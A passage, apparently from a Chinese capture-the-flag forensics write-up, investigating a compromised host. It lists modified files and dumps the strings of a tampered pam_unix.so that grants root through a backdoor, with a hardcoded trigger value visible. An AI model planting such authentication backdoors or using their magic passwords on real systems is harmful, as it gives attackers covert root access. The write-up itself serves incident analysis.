2>/dev/null\n/usr/lib/x86_64-linux-gnu/security/pam_unix.so\n/home/morri/.bash_logout\n/home/morri/.bashrc\n/home/morri/user.txt\n/home/morri/.profile\n/etc/gshadow-\n/etc/sudoers\n/etc/subgid-\n/etc/apt/sources.list\n/etc/hosts\n/etc/ld.so.cache\n/etc/shadow-\n/etc/subgid\n/etc/passwd-\n/etc/gshadow\n/etc/group-\n/etc/shadow\n/etc/subuid-\n/etc/php/8.3/apache2/php.ini\n/etc/subuid\n/etc/group\n/etc/hostname\n/etc/resolv.conf\n/etc/passwd\n/var/www/html/index.html\n/var/www/html/backdoor.php\n/var/log/debug\n/var/log/daemon.log.1\n/var/log/apt/eipp.log.xz\n/var/log/apt/term.log\n/var/log/apt/history.log\n/var/log/kern.log\n/var/log/syslog\n/var/log/btmp\n/var/log/auth.log.1\n/var/log/auth.log\n/var/log/dpkg.log\n/var/log/alternatives.log\n/var/log/lastlog\n/var/log/wtmp\n/var/log/syslog.1\n/var/log/faillog\n/var/log/debug.1\n/var/log/syslog.2.gz\n/var/log/daemon.log\n/var/log/user.log\n/var/log/messages\n/var/log/messages.1\n/var/log/kern.log.1\n/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397f6f5f0cb6-e7cfe6374e33fdfc.journal~\n/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system.journal\n/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~\n/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~\n/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000.journal\n/var/lib/dhcp/dhclient.enp0s3.leases\n/var/lib/dpkg/lock\n/var/lib/dpkg/info/libfl2:amd64.list\n/var/lib/dpkg/info/curl.list\n/var/lib/dpkg/info/m4.list\n/var/lib/dpkg/info/flex.list\n/var/lib/dpkg/info/libpam0g-dev:amd64.list\n/var/lib/dpkg/info/libsigsegv2:amd64.list\n/var/lib/dpkg/info/wget.list\n/var/lib/dpkg/info/libfl-dev:amd64.list\n/var/lib/dpkg/info/netcat-openbsd.list\n/var/lib/dpkg/info/bison.list\n/var/lib/dpkg/info/netcat.list\n/var/lib/dpkg/info/libpam0g:amd64.list\n/var/lib/dpkg/alternatives/yacc\n/var/lib/dpkg/alternatives/nc\n/var/lib/dpkg/triggers/Lock\n/var/lib/dpkg/status\n/var/lib/dpkg/status-old\n/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease\n/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages\n/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease\n/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources\n/var/lib/apt/extended_states\n/var/lib/systemd/random-seed\n/var/lib/systemd/timesync/clock\n/var/lib/systemd/timers/stamp-logrotate.timer\n/var/lib/systemd/timers/stamp-phpsessionclean.timer\n/var/lib/sudo/lectured/morri\n/var/lib/logrotate/status\n/var/cache/apt/pkgcache.bin\n/var/cache/apt/srcpkgcache.bin\n/var/cache/debconf/templates.dat\n/var/cache/debconf/config.dat-old\n/var/cache/debconf/config.dat\n/var/cache/debconf/templates.dat-old\n```\n\n\u4ed6\u6539\u4e86/usr/lib/x86_64-linux-gnu/security/pam_unix.so\uff0c\u8fd9\u662fPAM\u6846\u67b6\u7684\u4e00\u90e8\u5206,\u901a\u4fd7\u6613\u61c2\u4e00\u70b9\u5c31\u662f\u5bc6\u7801\u9a8c\u8bc1\n\nstring\u7784\u773c\n\n````\nmorri@Backdoor1:/opt$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so\nP`^B\n__gmon_start__\n_ITM_deregisterTMCloneTable\n_ITM_registerTMCloneTable\n__cxa_finalize\ncalloc\nmalloc\nstrncpy\nstrlen\ncrypt_r\nfree\npipe\nfork\ndup2\npam_modutil_sanitize_helper_fds\ngeteuid\nsetuid\nexecve\npam_syslog\nstdout\nfflush\n_exit\n__errno_location\nwaitpid\nsigaction\npam_modutil_read\n__isoc99_sscanf\npam_sm_acct_mgmt\npam_get_item\ngetuid\npam_get_data\ndcngettext\nsnprintf\ndcgettext\npam_sm_authenticate\npam_get_user\npam_get_authtok\npam_set_data\npam_sm_setcred\nstrcmp\nfopen\nfgets\nstrncmp\nstrtok_r\nfclose\npam_sm_chauthtok\npam_prompt\npam_set_item\nyp_get_default_domain\nyp_master\ngetrpcport\nstrdup\nclnt_create\nauthunix_create_default\nxdr_int\nclnt_sperrno\nyperr_string\npam_sm_open_session\npam_modutil_getlogin\npam_sm_close_session\nwrite\nfeof\n__getdelim\nstrchr\n__ctype_b_loc\nstrsep\nstrcasecmp\nstrncasecmp\nstrtol\nmemset\nyp_bind\nyp_match\nyp_unbind\nstrcpy\nmemcpy\npam_fail_delay\ngettimeofday\ngetpid\nclock\npam_modutil_getpwnam\npam_modutil_getspnam\ntime\nstpcpy\nusleep\nulckpwdf\numask\nfileno\n__fxstat\nfchown\nfchmod\nfputs\nfsync\nrename\nunlink\nfgetpwent\nputpwent\nfgetspent\nputspent\nxdr_string\nstrncat\nlibpam.so.0\nlibcrypt.so.1\nlibnsl.so.2\nlibc.so.6\npam_unix.so\nXCRYPT_2.0\nLIBNSL_1.0\nGLIBC_2.3\nGLIBC_2.7\nGLIBC_2.14\nGLIBC_2.2.5\nLIBPAM_EXTENSION_1.1\nLIBPAM_EXTENSION_1.0\nLIBPAM_1.0\nLIBPAM_MODUTIL_1.0\nLIBPAM_MODUTIL_1.1.9\n/root/Linux-PAM-1.3.1/libpam/.libs\nu/UH\nAWAVI\nAUATUH\n[]A\\A]A^A_\nAVAUI\n[]A\\A]A^A_\nt$01\nAUATUH\n]A\\A]A^\nT$ H\nHcL$\nT$ H\nD$ H\nD$ H\nAUATUH\n]A\\A]A^\n]A\\A]A^\n []A\\\n[]A\\\nAWAVAUATI\n[]A\\A]A^A_\nAVAUATUSH\nL$@H\nT$<H\nt$X1\nt$HH\nt$HL\nD$PH\nl$`H\nD$XD\nD$DH\nT$XD\nT$XH\nt$HH\nt$HD\nD$DH\nL$`D\nL$@H\nt$`D\nD$<H\nD$XH\n[]A\\A]A^A_\nT$HD\nT$X1\nT$XH\nt$HD\nt$HD\nt$HA\nD$hH\n|$pH\nD$hH\nD$ H\nD$pH\nL$ H\nt$hE\nL$ H\nATUH\n[]A\\A]\n[]A\\A]\nuWE1\n[]A\\\n[]A\\\nAVAUI\nt$01\n[]A\\A]A^A_\nATUSH\n[]A\\\n []A\\\nASARL\nATUSH\n[]A\\A]A^\nAVAUATA\n|$ H\nt$,H\nL$,D\n@D#d\n8[]D\nA\\A]A^A_\n|$ H\n|$ H\n|$ H\n|$ H\n|$ 1\nAVAUA\nu&E1\n[]A\\A]A^A_\n|$xL\nL$lL\nD$pH\n|$xA\nD$xA\nl$xI\nD$\\H\n|$ H\n|$0H\nT$HH\nD$@B\nD$\\H\nD$xH\nl$xL\nl$xL\nt$ I\nl$xL\nt$0I\nAUATUH\n ]A\\A]\n ]A\\A]\nAUATI\nL$ H\n-UN*X-FAH\n|$ H\n|$ H\n[]A\\A]A^A_\nT$(H\nD$(H\nt$ H\nL$@H\nT$8H\nD$HM\nATUIc\n[]A\\A]A^\nt$0L\nAWAVAUA\nu#E1\n[]A\\A]A^A_\n[]A\\A]\n[]A\\A]\n[]A\\A]\nATUH\n[]A\\\n[]A\\\nK H)\n{0H9\n$$1$\nAWAVAUATI\n|$ L\nh[]A\\A]A^A_\nh[]A\\A]A^A_\n[]A\\A]A^A_\nAWAVAUATUSH\nt$\\D\n|$`L\n|$XL\nT$8H\nD$ H\nD$(H\n[]A\\A]A^A_\ntmE9\nD$8H\nL$0L\nD$8H\nAWAVAUI\nATUSH\nt$0D\n|$,H\n|$(H\n[]A\\A]A^A_\nAWAVI\nATUSH\n|$|H\n|$xH\n[]A\\A]A^A_\nAVAUATUSD\np $E\nQZ^&\nA]A^\nAWAVI\n[]A\\A]A^A_\n[]A\\\nAVAUATI\nt$0H\n=UUUUwni\n$w}E\n=UUUUv\n|$ H\nD$,\n|$'L\n|$-\n|$(L\n|$.\n|$)L\n|$/\n|$*L\n|$%\n[]A\\A]A^A_\nAVAUATUSD\np $E\nQZ^&\nA]A^\nAWAVI\n[]A\\A]A^A_\n[]A\\\nAVAUATI\nt$0H\n=UUUUwni\n$w}E\n=UUUUv\n|$ H\nD$,\n|$'L\n|$-\n|$(L\n|$.\n|$)L\n|$/\n|$*L\n|$%\n[]A\\A]A^A_\nCould not make pipe: %m\nstdout\ndup2 of %s failed: %m\nsetuid failed: %m\n/sbin/unix_chkpwd\nchkexpiry\nunix_chkpwd abnormal exit: %d\nFork failed: %m\nunix_setcred_return\nLinux-PAM\nhelper binary execve failed: %m\nread unix_chkpwd output error %d: %m\nunix_chkpwd waitpid returned %d: %m\ncould not identify user (from uid=%lu)\ncould not identify user (from getpwnam(%s))\naccount %s has expired (account expired)\nYour account has expired; please contact your system administrator\nexpired password for user %s (root enforced)\nYou are required to change your password immediately (administrator enforced)\nexpired password for user %s (password aged)\nYou are required to change your password immediately (password expired)\naccount %s has expired (failed to change password)\npassword for user %s will expire in %d days\nWarning: your password will expire in %d days\nWarning: your password will expire in %d day\npam_unix_auth: cannot allocate ret_data\nauth could not identify password for [%s]\nPAM: Root access granted via backdoor\nbad username [%s]\n660930334\nNo password supplied\nPassword unchanged\nCan not get username\n/etc/security/opasswd\nbad authentication token\n or NIS\n not\nusername [%s] obtained\nChanging password for %s.\nuser not authenticated\nuser shadow entry expired\nnew password not acceptable 2\ncan't get local yp domain: %s\npasswd.byname\nnew password not acceptable\nYou must choose a longer password\ncan't open %s file to check old passwords\nPassword has been already used. Choose another.\npassword - could not identify user\nuser '%s' does not exist in /etc/passwd%s\nuser '%s' has corrupted passwd entry\npassword - (old) token not obtained\nYou must wait longer to change your password\npassword - new password not obtained\nuser password changed by another process\ncrypt() failure or out of memory for password\ncan't find the master ypserver: %s\nyppasswdd not running on NIS master host\nyppasswd daemon running on illegal port\nUse NIS server on %s with port %d\npassword%s changed for %s on %s\nNIS password could not be changed.\npassword received unknown request\nsession closed for user %s\nopen_session - error recovering username\nopen_session - error recovering service\nsession opened for user %s by %s(uid=%lu)\nclose_session - error recovering username\nclose_session - error recovering service\nnullok\nnonull\nstdin\n user=\n**unknown**\n/etc/login.defs\nENCRYPT_METHOD\nSHA_CRYPT_MAX_ROUNDS\nunrecognized option [%s]\n/etc/passwd\n_pam_unix_getpwnam_%s\nno memory for data-name\ncheck pass; user (%s) unknown\ncheck pass; user unknown\naudit\nuse_first_pass\ntry_first_pass\nauthtok_type=\nuse_authtok\ndebug\nnodelay\nbigcrypt\nlikeauth\nremember=\nnoreap\nbroken_shadow\nsha256\nsha512\nrounds=\nblowfish\nminlen=\nquiet\nno_pass_expiry\nCannot send password to helper: %m\n%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s\nservice(%s) ignoring max retries; %d > %d\noption remember not allowed for this module type\noption minlen not allowed for this module type\noption rounds not allowed for this module type\nPassword minlen reset to 8 characters\nunrecognized ENCRYPT_METHOD value [%s]\nauthentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s\nno memory for failure recorder\n/dev/urandom\n*NP*\n$2a$\nrounds=%u$\n/etc/security/nopasswd\n%s:%s:%d:%s\n%s:%s:%d:%s,%s\n%s:%lu:1:%s\n/etc/npasswd\npassword changed for %s\n/etc/nshadow\n/etc/shadow\naccount %s has password changed in future\nAlgo %s not supported by the crypto backend, falling back to MD5\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./\n./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n;*3$'\nGCC: (Debian 10.2.1-6) 10.2.1 20210110\n|!3)\n|%rc\n        3       -\n        4       -\n        8       -\n        9       -\n        :       -\n low\n'key\n low\n(pwd\n~20'\n $0.(\n;pwd\n;err\n(buf\n;len\n><D\nCerr\n'pwd\n'new\n'old\n'tty\n9% 1\n'pwd\n'fds\n'len\n!nis\n!nis\n!ret\n'buf\n~'len\n!err\nP'tty\n5val\n;key\n=buf\n?=tmp\n;__n\n~$len\n0pwd\n0pwd\n0pwd\n $,(\n $,(\n/usr/include\nbigcrypt.c\ncrypt.h\nstdlib.h\nstring.h\n<built-in>\n/usr/lib/gcc/x86_64-linux-gnu/10/include\n/usr/include/x86_64-linux-gnu/bits\n/usr/include/x86_64-linux-gnu/bits/types\n/usr/include\n../../libpam/include/security\n/usr/include/x86_64-linux-gnu/sys\npam_unix_acct.c\nstddef.h\ntypes.h\n__sigset_t.h\nstruct_FILE.h\nFILE.h\npwd.h\nshadow.h\n__sigval_t.h\nsiginfo_t.h\nsignal.h\nsigaction.h\n_pam_types.h\nsupport.h\nstdio.h\npam_modules.h\npassverify.h\nunistd.h\npam_ext.h\nlibintl.h\npam_modutil.h\nerrno.h\nwait.h\n<built-in>\n../../libpam/include/security\n/usr/include\n/usr/include/x86_64-linux-gnu/sys\npam_unix_auth.c\nsupport.h\n_pam_types.h\npam_modules.h\nstdlib.h\npam_ext.h\nsyslog.h\n/usr/lib/gcc/x86_64-linux-gnu/10/include\n/usr/include/x86_64-linux-gnu/bits\n/usr/include/x86_64-linux-gnu/bits/types\n/usr/include/x86_64-linux-gnu/sys\n/usr/include\n../../libpam/include/security\n/usr/include/rpc\n/usr/include/netinet\n/usr/include/rpcsvc\npam_unix_passwd.c\nstddef.h\ntypes.h\nstruct_FILE.h\nFILE.h\ntypes.h\nstdint-intn.h\nstruct_timeval.h\npwd.h\nshadow.h\n_pam_types.h\nsupport.h\ntypes.h\nstdint-uintn.h\nsockaddr.h\nsocket.h\nin.h\nun.h\nxdr.h\nauth.h\nclnt.h\nyppasswd.h\npam_ext.h\nypclnt.h\npassverify.h\nstring.h\nmalloc.h\nlibintl.h\npam_modules.h\nmd5.h\nstdio.h\n../../libpam/include/security\n/usr/include\npam_unix_sess.c\nsupport.h\n_pam_types.h\npam_ext.h\npam_modutil.h\nunistd.h\n/usr/include/x86_64-linux-gnu/bits\n/usr/include\n/usr/lib/gcc/x86_64-linux-gnu/10/include\n/usr/include/x86_64-linux-gnu/sys\n/usr/include/x86_64-linux-gnu/bits/types\n../../libpam/include/security\n/usr/include/rpcsvc\nsupport.c\nstdio.h\nstdlib.h\nstddef.h\ntypes.h\ntypes.h\n__sigset_t.h\nstruct_FILE.h\nFILE.h\npwd.h\n__sigval_t.h\nsiginfo_t.h\nsignal.h\nsigaction.h\n_pam_types.h\nsupport.h\npam_ext.h\npam_modutil.h\nstring.h\nunistd.h\npam_modules.h\nmalloc.h\npassverify.h\nerrno.h\nwait.h\nstdio.h\nctype.h\nypclnt.h\n<built-in>\nstrings.h\n[Y;YYWYYWYYWY\n/usr/include/x86_64-linux-gnu/sys\n/usr/lib/gcc/x86_64-linux-gnu/10/include\n/usr/include/x86_64-linux-gnu/bits\n/usr/include/x86_64-linux-gnu/bits/types\n../../libpam/include/security\n/usr/include\npassverify.c\nstat.h\nstddef.h\ntypes.h\nstruct_timeval.h\nstruct_timespec.h\n_pam_types.h\npwd.h\nFILE.h\nstruct_FILE.h\nsupport.h\nshadow.h\ntime.h\nstat.h\ncrypt.h\nmd5.h\nstdio.h\nunistd.h\nstring.h\ntime.h\npam_ext.h\nstdlib.h\npam_modutil.h\nbigcrypt.h\n<built-in>\nfcntl.h\nerrno.h\n/X ..\nX  ..\n[  ..\n= J.\n<  X\nf...\n/usr/include/rpc\n/usr/include/x86_64-linux-gnu/bits\n/usr/include/x86_64-linux-gnu/sys\n/usr/include/netinet\nyppasswd_xdr.c\ntypes.h\ntypes.h\ntypes.h\nstdint-intn.h\nstdint-uintn.h\nsockaddr.h\nsocket.h\nin.h\nun.h\nxdr.h\nyppasswd.h\n/usr/include\nmd5.c\nmd5_crypt.c\nmd5.h\nstdlib.h\nstring.h\n<built-in>\nr/;<\nu;=I\n==H<\n0:/;=I<\n18=-\nuI=;\nue=-\nJtu-\nftu-\nK-=-\nJtu-\nftu-\nK-=-\nK-=-\nJtu-\nftu-\nftu-\nJtu-\n.V>,\n.K-=-\nfu-=-\n/-/-Ju.I<\n.W=-\n0,0,.\n.W=-\n.W=-\n0:0:.\n:/=:<\nyJ.K\n        ?/KH\n/usr/include\nmd5.c\nmd5_crypt.c\nmd5.h\nstdlib.h\nstring.h\n<built-in>\nr/;<\nu;=I\n==H<\n0:/;=I<\n18=-\nuI=;\nue=-\nJtu-\nftu-\nK-=-\nJtu-\nftu-\nK-=-\nK-=-\nJtu-\nftu-\nftu-\nJtu-\n.V>,\n.K-=-\nfu-=-\n/-/-Ju.I<\n.W=-\n0,0,.\n.W=-\n.W=-\n0:0:.\n:/=:<\nyJ.K\n        ?/KH\ninternal\nbigcrypt\ncrypt_data\nshort unsigned int\ncipher_ptr\n__xx__\ntmp_ptr\nunsigned char\ninput\ninitialized\nbigcrypt.c\nsetting\nstrncpy\nplaintext_ptr\ncrypt_r\nGNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables\nlong long unsigned int\ndec_c2_cryptbuf\n__builtin_calloc\nlong long int\nkeybuf\n/root/Linux-PAM-1.3.1/modules/pam_unix\nshort int\nkeylen\noutput\nn_seg\ncdata\nsalt_ptr\nmalloc\n__off_t\n__gid_t\n_IO_read_ptr\n_pkey\n_chain\nvoid_uname\n__sigval_t\nsi_errno\n_shortbuf\n_make_remark\nis_hash_algo\nsa_flags\n_IO_read_base\n__sighandler_t\n_lower\nsi_stime\npipe\n_arch\npw_shell\n_exit\ndup2\npamh\n_fileno\n_IO_read_end\n_sigchld\nauthrv\n_IO_backup_base\n__isoc99_sscanf\nexecve\nenvp\n_cur_column\n_upper\nsi_overrun\n_IO_codecvt\nsp_inact\n_bounds\nsi_addr\nsp_max\n_old_offset\nsp_min\nsi_addr_lsb\nsi_sigval\nsp_flag\nnewsa\ngeteuid\n__off64_t\npam_unix_acct.c\nsi_pid\npam_modutil_redirect_fd\n_IO_marker\n_freeres_buf\nPAM_MODUTIL_IGNORE_FD\n__val\nsi_utime\nget_account_info\n_IO_write_ptr\n__sigset_t\nwaitpid\nfork\nsi_uid\n_pad\nsiginfo_t\n_IO_save_base\nsival_int\nsp_expire\npam_modutil_sanitize_helper_fds\n_lock\n_sigsys\n_flags2\n__builtin_puts\nstdout\npw_passwd\n_syscall\npam_sm_acct_mgmt\nunix_args\npw_gid\n_sigpoll\n_sifields\npam_get_data\n_IO_write_end\nPAM_MODUTIL_PIPE_FD\n_IO_lock_t\n_IO_FILE\nsetuid\noldsa\nsi_tid\n__clock_t\nUNIX_Ctrls\npam_get_item\ndcngettext\nsp_pwdp\nPAM_MODUTIL_NULL_FD\ntoken\nfflush\n_markers\npw_dir\n_sigfault\nsp_warn\npam_handle_t\n_IO_buf_end\n_addr_bnd\n__pid_t\n_call_addr\npw_gecos\n_vtable_offset\npretval\ndcgettext\nspwd\nsi_status\nargc\n__errno_location\n__uint32_t\ncheck_shadow_expiry\n__uid_t\n__sigaction_handler\nsi_signo\n_kill\n_IO_save_end\nsa_sigaction\nsa_mask\ndaysleft\n__pad0\n__pad5\nsnprintf\nsp_lstchg\n_unused2\nsa_restorer\npw_name\n_unix_run_verify_binary\npam_handle\n_set_ctrl\ngetuid\npam_modutil_read\n_timer\nsi_fd\npam_syslog\npw_uid\nsa_handler\n_freeres_list\nsival_ptr\n_IO_wide_data\nsi_band\nargv\n_IO_write_base\n_IO_buf_base\nsp_namp\nchild\nsi_code\nret_data\npam_sm_setcred\n_unix_verify_password\n_unix_blankpasswd\npam_set_data\npam_get_authtok\nsetcred_free\npam_get_user\npam_sm_authenticate\npam_unix_auth.c\npass_old\nAUTH_REJECTEDCRED\nXDR_DECODE\nsockaddr_ax25\nsin6_flowinfo\nRPC_CANTDECODEARGS\nfclose\nRE_why\nlctrl\nRE_lb\nxdrproc_t\nstrncmp\n_do_setpass\nah_ops\nRPC_RPCBFAILURE\nsptr\nsockaddr\nsin6_scope_id\nhigh\nsockaddr_ns\nclnt_sperrno\nRPC_CANTDECODERES\npam_sm_chauthtok\n__int32_t\nxdr_op\nmd5pass\nah_verf\nIPPROTO_IGMP\nIPPORT_TFTP\npam_unix_passwd.c\nIPPORT_USERRESERVED\nIPPORT_NAMESERVER\nRPC_PROGNOTREGISTERED\nIPPORT_SYSTAT\ncl_freeres\nx_getint32\n__u6_addr16\n__caddr_t\nIPPROTO_SCTP\nIPPROTO_IP\nauth_ops\nsockaddr_ipx\nah_nextverf\nnewpass\nIPPORT_WHOIS\ngetNISserver\nIPPORT_CMDSERVER\nIPPORT_FTP\nin_addr_t\nGoodcrypt_md5\nIPPROTO_ESP\n_unix_getpwnam\nx_getpostn\nIPPROTO_EGP\nsockaddr_at\nRPC_INTR\nah_refresh\nIPPROTO_IPV6\n__u6_addr8\nRPC_INPROGRESS\nclnt_ops\nCLIENT\nIPPORT_FINGER\nAUTH_BADVERF\n_unix_comesfromsource\nIPPORT_WHOSERVER\nunlock_pwdf\n__uint16_t\nIPPROTO_MAX\nRPC_CANTSEND\noa_length\nx_getbytes\nRPC_SUCCESS\nin_port_t\nRPC_VERSMISMATCH\nIPPORT_RJE\nIPPORT_BIFFUDP\nstrtok_r\nRPC_SYSTEMERROR\nre_status\nsin_zero\nx_destroy\nRPC_UNKNOWNADDR\nIPPORT_SMTP\ns_addr\ncl_geterr\nx_ops\nsa_family_t\ncl_private\ns_luser\ncl_call\nbool_t\nIPPROTO_BEETPH\nRPC_TIMEDOUT\npam_set_item\nx_putint32\nsockaddr_inarp\nenum_t\noa_flavor\nsin_family\ntv_usec\n__u_long\nAUTH_OK\nsockaddr_iso\nAUTH\nIPPROTO_UDP\nXDR_FREE\ns_npas\nx_public\nRE_errno\nyperr_string\nremember\nopaque_auth\nrounds\ncl_ops\nIPPROTO_IPIP\nIPPORT_LOGINSERVER\nx_putlong\nIPPORT_ROUTESERVER\nunix_update_passwd\nah_cred\nRPC_TLIERROR\ntowhat\nx_inline\nforwho\nIPPORT_DISCARD\nx_putbytes\ns_pas\nah_marshal\nIPPORT_ECHO\ncl_abort\nxdr_ops\nRPC_PROGUNAVAIL\nopwfile\nIPPROTO_PUP\ncheck_old_password\nXDR_ENCODE\nsin_port\nIPPROTO_AH\nsockaddr_eon\nauthunix_create_default\nIPPROTO_ICMP\nunlocked\n__u6_addr32\nsockaddr_un\ncreate_password_hash\nnewpw\nyp_get_default_domain\nRPC_STALERACHANDLE\n__in6_u\nsin_addr\nah_validate\nRPC_FAILED\nRE_vers\ncl_destroy\nfopen\nAUTH_BADCRED\nsave_old_password\ndone\nIPPROTO_IDP\nx_setpostn\nfgets\ntimeval\nyppwd\nlong double\noldpass\nAUTH_FAILED\nsin6_port\nIPPORT_NETSTAT\nIPPROTO_RSVP\nIPPROTO_GRE\nx_base\nIPPORT_EXECSERVER\nAUTH_REJECTEDVERF\nyp_master\nIPPORT_TTYLINK\nsin6_family\n_pam_unix_approve_pass\nsockaddr_dl\noa_base\nIPPORT_TELNET\nRPC_UNKNOWNHOST\nRPC_UNKNOWNPROTO\nIPPROTO_PIM\nsun_family\nah_private\nRPC_PROGVERSMISMATCH\nRPC_CANTENCODEARGS\nsun_path\nsockaddr_in\nauth_stat\n__uint8_t\n_unix_verify_shadow\nIPPROTO_MTP\nx_getlong\nIPPROTO_TP\nx_op\nfromwhat\ntv_sec\npass_min_len\nIPPORT_DAYTIME\nAUTH_TOOWEAK\nIPPROTO_UDPLITE\ncl_control\nIPPROTO_COMP\nIPPROTO_ENCAP\nRPC_NOBROADCAST\nrpc_err\nunix_update_shadow\ncl_auth\ntimeout\nRPC_N2AXLATEFAILURE\ndomainname\nclnt\nah_key\n__suseconds_t\nIPPORT_SUPDUP\n__time_t\ndes_block\nIPPORT_EFSSERVER\nIPPORT_TIMESERVER\nclnt_create\nclnt_stat\nIPPROTO_TCP\nstrcmp\nIPPORT_RESERVED\nsa_family\nstrdup\ngetrpcport\nIPPROTO_MPLS\npass_new\nRPC_UDERROR\nx_private\n__u_int\npam_prompt\nx_handy\ns_uid\nIPPORT_MTP\nah_destroy\nsockaddr_in6\nIPPROTO_DCCP\nsa_data\nis_pwd_shadowed\nsin6_addr\nIPPROTO_RAW\nsockaddr_x25\nretry\nAUTH_INVALIDRESP\nRPC_CANTRECV\nRPC_PROCUNAVAIL\nRPC_AUTHERROR\npam_modutil_getlogin\npam_unix_sess.c\nlogin_name\nservice\nuser_name\npam_sm_open_session\npam_sm_close_session\n__stream\nquiet\nyp_match\n_ISgraph\n_pam_failed_auth\n__ssize_t\nwrite\n__lineptr\ntype\nstrcasecmp\n_unix_cleanup\natoi\n__nptr\n__builtin_memset\n_ISprint\nget_pwd_hash\n_cleanup_failures\nfailure\nspasswd\nmatched\nyp_bind\nstrsep\nfilename\n__builtin_memcpy\n_ISpunct\nsuid\nuserlen\nverify_pwd_hash\nstrcpy\n_ISxdigit\n_ISupper\n__ctype_b_loc\n_IScntrl\nsupport.c\nvoid_old\ncount\nbuflen\nshome\nfeof\nsearch_key\n_ISalpha\n_ISblank\n_ISalnum\nslogin\npam_fail_delay\n_ISspace\nsgid\ngetline\nuserinfo\n_ISlower\nstrtol\n__getdelim\nsgecos\n_unix_run_helper_binary\nyp_unbind\nruser\ndata_name\nsshell\nstrncasecmp\n_ISdigit\nfiles\nrhost\nerror_status\n__glibc_reserved\nst_ctim\nunlink\nst_blksize\nst_blocks\nMD5Context\nuint32\ncrypted\nst_mtim\nfound\ncurdays\n__dev_t\nresult\nwhere\nusleep\nstrip_hpux_aging\nspwdent\nnbuf\numask\n__blksize_t\nst_uid\ncrypt_make_salt\nst_rdev\nGoodMD5Update\n__syscall_slong_t\nalgoid\nulckpwdf\ntimezone\n__mode_t\nfchown\nst_gid\nputspent\nhowmany\nstpcpy\nst_size\ngetpid\nclock\nfstat\n__blkcnt_t\ntz_minuteswest\n__ino_t\nconst_charp\ntmppass\nunix_selinux_confined\ncrypt_md5_wrapper\n__builtin_strchr\nbits\n__fd\npam_modutil_getspnam\npam_modutil_getpwnam\nrename\nnullok\n__fxstat\noldmask\nst_nlink\nGoodMD5Final\npassverify.c\nst_dev\ntimespec\nfchmod\ngettimeofday\nassigned_passwd\ni64c\nfputs\nfgetspent\nfgetpwent\ntv_nsec\nvalid\nstmpent\nGoodMD5Init\nst_mode\nputpwent\nfsync\ntz_dsttime\nBrokencrypt_md5\nhash_len\nst_ino\n__statbuf\nMD5_CTX\n__nlink_t\nst_atim\nwroteentry\nxdr_yppasswd\nxdr_int\nyppasswd_xdr.c\nxdrs\nxdr_string\nobjp\nxdr_xpasswd\nlongs\nmd5_good.c\nfinal\nto64\nctx1\nstrncat\n__builtin_strlen\nbyteReverse\nitoa64\nGoodMD5Transform\ndigest\nmagic\nBrokenMD5Update\nBrokenMD5Final\nBrokenMD5Transform\nmd5_broken.c\nBrokenMD5Init\n $-(\nQ@I$\nQ@I$\nQ@J$\nQ@J$\n# %!\n# %!x\n# %!\n# %!'\n# %!\n# %!x\n# %!\n# %!'\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nbigcrypt.c\npam_unix_acct.c\nenvp.0\npam_unix_auth.c\nsetcred_free\npam_unix_passwd.c\n_unix_verify_shadow\n_pam_unix_approve_pass\npam_unix_sess.c\nsupport.c\n_unix_cleanup\n_unix_run_helper_binary\n_cleanup_failures\nsearch_key.constprop.0\nunix_args\npassverify.c\ncrypt_make_salt\nvalid.2\nbuf.1\nnbuf.0\nyppasswd_xdr.c\nmd5_good.c\nitoa64\nmd5_broken.c\n__FRAME_END__\nxdr_yppasswd\n_unix_run_verify_binary\n_set_ctrl\nBrokenMD5Transform\nget_account_info\nGoodcrypt_md5\nBrokenMD5Init\nbigcrypt\n_fini\nsave_old_password\ncrypt_md5_wrapper\nunix_update_passwd\nunix_update_shadow\ncreate_password_hash\nBrokencrypt_md5\n__dso_handle\n_unix_getpwnam\nGoodMD5Final\n_unix_comesfromsource\nGoodMD5Transform\n_make_remark\n_DYNAMIC\nis_pwd_shadowed\nunlock_pwdf\nBrokenMD5Final\nunix_selinux_confined\nGoodMD5Init\nget_pwd_hash\ncheck_shadow_expiry\n__GNU_EH_FRAME_HDR\n__TMC_END__\n_GLOBAL_OFFSET_TABLE_\nGoodMD5Update\n_unix_blankpasswd\n_unix_verify_password\nverify_pwd_hash\n_init\nBrokenMD5Update\nxdr_xpasswd\npam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9\nfree@GLIBC_2.2.5\npam_modutil_getpwnam@LIBPAM_MODUTIL_1.0\nstrcasecmp@GLIBC_2.2.5\n__errno_location@GLIBC_2.2.5\nunlink@GLIBC_2.2.5\nstrncpy@GLIBC_2.2.5\nstrncmp@GLIBC_2.2.5\n_ITM_deregisterTMCloneTable\nstdout@GLIBC_2.2.5\n_exit@GLIBC_2.2.5\nstrcpy@GLIBC_2.2.5\npam_set_item@LIBPAM_1.0\npam_get_data@LIBPAM_1.0\nputspent@GLIBC_2.2.5\nsigaction@GLIBC_2.2.5\npam_sm_setcred\npam_prompt@LIBPAM_EXTENSION_1.0\nwrite@GLIBC_2.2.5\ngetpid@GLIBC_2.2.5\nclock@GLIBC_2.2.5\nyp_unbind@LIBNSL_1.0\nfclose@